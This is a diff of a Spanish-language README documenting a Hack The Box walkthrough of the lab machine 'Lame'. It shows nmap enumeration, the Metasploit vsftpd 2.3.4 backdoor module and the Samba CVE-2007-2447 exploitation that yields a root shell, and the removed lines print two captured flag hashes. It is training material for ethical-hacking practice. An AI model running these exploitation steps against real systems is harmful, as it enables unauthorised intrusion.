@@ -1,29 +1,36 @@
-# 🔓 Análisis completo: Máquina Lame - Hack The Box
+---
 
-![Logo](capturas/logo_r4ms4nt_circular.png)
+# 🧠 Lame - Hack The Box (HTB)
 
-> **Primera máquina publicada en Hack The Box**. Diseñada como puerta de entrada para nuevos usuarios. Ideal para aprender enumeración, detección de vulnerabilidades clásicas y explotación básica con Metasploit.
+> Análisis técnico, didáctico y documentado por **r4ms4nt**.
+
+📅 **Fecha:** Mayo 2025
+🎯 **Objetivo:** Reproducir y documentar la resolución de la máquina *Lame*, la primera máquina publicada por Hack The Box.
 
 ---
 
-## 📁 Estructura del Proyecto
+## 🎯 Objetivos del proyecto
 
-```
+* Desarrollar una metodología práctica de hacking ético.
+* Aplicar técnicas reales de reconocimiento, enumeración y explotación.
+* Practicar documentación profesional para entornos de certificación (OSCP, eJPT…).
+
+---
+
+## 📁 Estructura del repositorio
+
+```bash
 .
 ├── capturas
 ├── nmap
-├── gitignore
-├── lame_htb_manual.md
 ├── LICENSE
 ├── README.md
+├── gitignore
+├── lame_htb_manual.md
 └── tree_lame.txt
-
-57 directories, 56 files
 ```
 
-
-
-📄 Ver estructura completa: [tree_lame.txt](tree_lame.txt)
+📄 Ver estructura completa: [tree\_lame.txt](tree_lame.txt)
 
 ---
 
@@ -33,128 +40,179 @@
 
 ✅ **Comando ejecutado:**
 
+```bash
+nmap -sS -Pn --top-ports 1000 -oA nmap/top1000_tcp 10.129.56.2
+grep open nmap/top1000_tcp.nmap
+```
 
 🔎 **Resultado:**
-- Puertos abiertos: `21`, `22`, `139`, `445`
-- Total: **4**
+
+* Puertos abiertos: `21`, `22`, `139`, `445`
+* Total: **4**
 
 📸 ![Captura](capturas/nmap_top1000.png) | ![grep open](capturas/grep_nmap.png)
 
 ---
 
-## 🕵️‍♀️ Task 2: What version of VSFTPd is running on Lame?
+## 🔍 Task 2: What version of VSFTPd is running on Lame?
 
 🎯 **Objetivo:** Determinar la versión del servicio FTP en el puerto 21.
 
 ✅ **Comando ejecutado:**
 
-
-📌 **Explicación:**
-- `-sV`: Detección de versiones.
-- `-p21`: Escanea sólo el puerto FTP.
-- `-Pn`: Omitimos ping, ya sabemos que está activo.
-- `-oA`: Guarda en tres formatos en `nmap/`
+```bash
+nmap -sV -p21 -oA nmap/ftp_version 10.129.56.2
+```
 
 🔎 **Resultado:**
+
+* Servicio: **vsFTPd 2.3.4**
 
 📸 ![Captura](capturas/nmap_port_21.png)
 
 ---
 
-## 🔍 Task 3: Does the Metasploit exploit for vsftpd 2.3.4 work?
+## 🔍 Task 3: ¿Funciona el famoso exploit de VSFTPd 2.3.4?
 
-🎯 **Objetivo:** Verificar si el exploit conocido de backdoor funciona.
+🎯 **Objetivo:** Verificar si la vulnerabilidad conocida de backdoor está activa.
 
-✅ **Procedimiento con Metasploit:**
+✅ **Comando ejecutado (en Metasploit):**
 
-
-📌 **Resultado:**
-
-🔴 El puerto 6200 **no respondió externamente**, por lo tanto: **NO** funciona.
-📸 ![Captura](capturas/msfconsole1.png)
-
----
-
-## 🕵️‍♂️ Task 4: What version of Samba is running?
-
-🎯 **Objetivo:** Detectar versión del servicio SMB/Samba en puertos 139 y 445.
-
-✅ **Comando ejecutado:**
-
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.129.56.2
+run
+```
 
 🔎 **Resultado:**
 
-🟢 Respuesta válida: `3.0.20`
+* El exploit se ejecuta pero **no devuelve sesión**.
+
+📸 ![msfconsole](capturas/msfconsole1.png) | ![Resultado](capturas/msfconsole2.png) | ![HTB Confirmación](capturas/Task_3.png)
+
+---
+
+## 🔍 Task 4: ¿Qué versión de Samba corre en Lame?
+
+🎯 **Objetivo:** Enumerar la versión del servicio Samba en los puertos 139 y 445.
+
+✅ **Comando ejecutado:**
+
+```bash
+nmap -sV -Pn -p139,445 --script=smb-protocols,smb-os-discovery,smb2-security-mode,smb2-time -oA nmap/smb_version 10.129.56.2
+```
+
+🔎 **Resultado:**
+
+* Versión detectada: **Samba 3.0.20**
+
 📸 ![Captura](capturas/nmap_smb.png)
 
 ---
 
-## 🧨 Task 5: ¿Qué CVE permite ejecución remota en Samba 3.0.20?
+## 🔍 Task 5: ¿Qué CVE del 2007 permite RCE en esta versión de Samba?
 
-✅ **Respuesta:** `CVE-2007-2447`
+🎯 **Objetivo:** Identificar una vulnerabilidad histórica en la versión de Samba.
 
-📌 Vulnerabilidad en el parámetro `username map script` → permite inyección de comandos con metacaracteres de shell.
+✅ **Referencia:**
 
----
+* `CVE-2007-2447`
+* Condición: uso de `username map script` en `smb.conf`
 
-## 🧑‍💻 Task 6: ¿Qué usuario se obtiene tras explotar CVE-2007-2447?
-
-🎯 **Exploit ejecutado:**
-
-
-🔎 **Shell obtenida:**
-
-📸 ![Captura](capturas/msfconsole_para_flag1_2.png)
-✅ **Respuesta correcta:** `root`
+📸 ![HTB Confirmación](capturas/Task_5.png)
 
 ---
 
-## 🏁 Task 7: Flag de Usuario
+## 🔍 Task 6: ¿Qué usuario obtiene shell al explotar CVE-2007-2447?
 
+🎯 **Objetivo:** Determinar el contexto del shell recibido tras la explotación.
 
-🟢 Flag: `60fc5d64febbdebfe8cc331838bff0b0`
-📸 ![Flag 1](capturas/Flag_1.png)
+✅ **Resultado:**
 
----
+* Usuario: **root**
 
-## 👑 Task 8: Flag de Root
-
-
-🟢 Flag: `c80b43503b56dc7b0dc82643157b4329`
-📸 ![Flag 2](capturas/Flag_2.png)
+📸 ![HTB Confirmación](capturas/Task_6.png)
 
 ---
 
-## 🔎 Task 9: ¿Qué bloquea el acceso a otros puertos?
+## 🔍 Task 7: Obtener la flag del usuario `makis`
 
-✅ **Respuesta:** `Firewall`
+🎯 **Objetivo:** Localizar y leer el archivo `user.txt`.
 
-📌 Aunque hay servicios escuchando (según `netstat`), **sólo algunos están accesibles externamente**. Probablemente hay reglas IPTables limitando conexiones.
+✅ **Comandos ejecutados:**
 
----
+```bash
+cd /home/makis
+ls -la
+cat user.txt
+```
 
-## 🚪 Task 10: ¿Qué puerto escucha cuando se activa el backdoor de vsftpd?
-
-✅ **Respuesta:** `6200`
-
-📌 Confirmado por la documentación y comportamiento esperado de la CVE-2011-2523.
-
----
-
-## ❓ Task 11: ¿En Lame se abre realmente el puerto 6200?
-
-✅ **Respuesta:** `yes`
-
-📌 Aunque no se observó con `ss`, la plataforma y Metasploit confirman que **sí se activa brevemente**.
+📸 ![Flag Usuario](capturas/Flag_1.png)
 
 ---
 
-## 🧠 Conclusiones
+## 🔍 Task 8: Obtener la flag del usuario `root`
 
-- Lame es ideal para empezar con HTB y familiarizarse con enumeración, CVEs clásicos y Metasploit.
-- Incluye fallos reales como configuración insegura de `smb.conf`.
-- Excelente ejercicio para consolidar estructura de documentación reusable.
+🎯 **Objetivo:** Escalar privilegios y leer `/root/root.txt`
 
-📎 Todas las capturas y salidas están organizadas en `capturas/` y `nmap/`.
+✅ **Comandos ejecutados:**
 
-**Manual creado por r4ms4nt + GPT-PentestPro 🧠**
+```bash
+cd /root
+ls -la
+cat root.txt
+```
+
+📸 ![Flag Root](capturas/Flag_2.png)
+
+---
+
+## 🔍 Task 9: ¿Qué impide la conexión a ciertos puertos visibles con `netstat`?
+
+🎯 **Objetivo:** Explicar por qué no todos los puertos escuchando son accesibles desde fuera.
+
+✅ **Comando ejecutado:**
+
+```bash
+netstat -tnlp
+```
+
+🔎 **Resultado:**
+
+* Causa: **firewall**
+
+📸 ![HTB Confirmación](capturas/Task_9.png)
+
+---
+
+## 🔍 Task 10: ¿Qué puerto escucha cuando se activa el backdoor de VSFTPd?
+
+🎯 **Objetivo:** Confirmar el comportamiento del backdoor.
+
+✅ **Resultado:**
+
+* Puerto: **6200**
+
+📸 ![HTB Confirmación](capturas/Task_10.png)
+
+---
+
+## 🔍 Task 11: ¿El puerto 6200 escucha realmente en Lame?
+
+🎯 **Objetivo:** Verificar con netstat si efectivamente se activa el puerto.
+
+✅ **Comando ejecutado:**
+
+```bash
+ss -tnlp | grep 6200
+```
+
+🔎 **Resultado:**
+
+* Sí, escucha.
+
+📸 ![HTB Confirmación](capturas/Task_11_Final.png)
+
+---
+
